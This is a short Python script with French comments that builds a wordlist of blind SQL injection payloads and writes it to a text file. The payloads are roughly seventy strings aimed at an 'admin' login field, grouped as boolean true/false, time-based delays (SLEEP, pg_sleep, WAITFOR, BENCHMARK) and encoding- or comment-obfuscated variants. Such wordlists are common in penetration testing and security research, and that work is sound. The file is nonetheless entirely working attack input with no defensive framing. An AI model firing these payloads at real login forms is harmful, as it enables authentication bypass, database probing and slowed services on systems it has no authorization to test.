# Création du fichier de payloads SQLi aveugles

payloads = []

# Boolean TRUE payloads - 20 variations
payloads.extend([
    "admin' OR 1=1--",
    "admin' OR '1'='1'--",
    "admin' OR 1=1#",
    "admin' OR '1'='1'#",
    "admin' OR 1=1/*",
    "admin' OR '1'='1'/*",
    "admin'||1=1--",
    "admin'||'1'='1'--",
    "1' OR '1'='1'--",
    "1' OR 1=1--",
    "admin' OR 2>1--",
    "admin' OR 3<4--",
    "admin' OR 1 LIKE 1--",
    "admin' OR 'a'='a'--",
    "admin' OR 'x'<>'y'--",
    "admin' OR 1 IN (1)--",
    "admin' OR EXISTS(SELECT 1)--",
    "admin' OR (SELECT 1)=1--",
    "admin' OR 1=1-- -",
    "admin' OR 1=1;%00"
])

# Boolean FALSE payloads - 10 variations
payloads.extend([
    "admin' OR 1=0--",
    "admin' OR '1'='0'--",
    "admin' AND 1=0--",
    "admin' AND '1'='0'--",
    "admin' OR 2>3--",
    "admin' OR 'x'='y'--",
    "admin' OR 1 LIKE 0--",
    "admin' OR 5=6--",
    "admin' OR 'a'='b'--",
    "admin' OR (SELECT 1)=0--"
])

# Time-based payloads - 20 variations
payloads.extend([
    "admin' OR SLEEP(5)--",
    "admin' OR SLEEP(10)--",
    "admin' OR pg_sleep(5)--",
    "admin' OR pg_sleep(10)--",
    "admin' OR WAITFOR DELAY '0:0:5'--",
    "admin' OR WAITFOR DELAY '0:0:10'--",
    "admin' OR BENCHMARK(1000000,MD5(1))--",
    "admin' OR BENCHMARK(5000000,MD5(1))--",
    "admin' OR BENCHMARK(10000000,SHA1(1))--",
    "1' OR SLEEP(5)--",
    "1' OR pg_sleep(5)--",
    "1' OR WAITFOR DELAY '0:0:5'--",
    "admin';WAITFOR DELAY '0:0:5'--",
    "admin';SELECT pg_sleep(5)--",
    "admin' OR IF(1=1,SLEEP(5),0)--",
    "admin' OR IF(1=1,pg_sleep(5),0)--",
    "admin' OR (SELECT CASE WHEN 1=1 THEN SLEEP(5) END)--",
    "admin' OR (SELECT CASE WHEN 1=1 THEN pg_sleep(5) END)--",
    "admin' UNION SELECT SLEEP(5)--",
    "admin' UNION SELECT pg_sleep(5)--"
])

# Obfuscated payloads - 10+ variations
payloads.extend([
    "admin'%20OR%201=1--",
    "admin'%20OR%20'1'='1'--",
    "admin'/**/OR/**/1=1--",
    "admin'/*foo*/OR/*bar*/1=1--",
    "admin'%09OR%091=1--",
    "admin'%0aOR%0a1=1--",
    "admin'%0bOR%0b1=1--",
    "admi'||'n' OR 1=1--",
    "admi'+'n' OR 1=1",
    "admin' OR CHR(97)='a'--",
    "AdMiN' Or 1=1--",
    "admin'/**/OR/**/1=1/**/--"
])

# Écriture dans le fichier
with open('sqli_blind_payloads.txt', 'w') as f:
    f.write('\n'.join(payloads))

print('created:sqli_blind_payloads.txt')
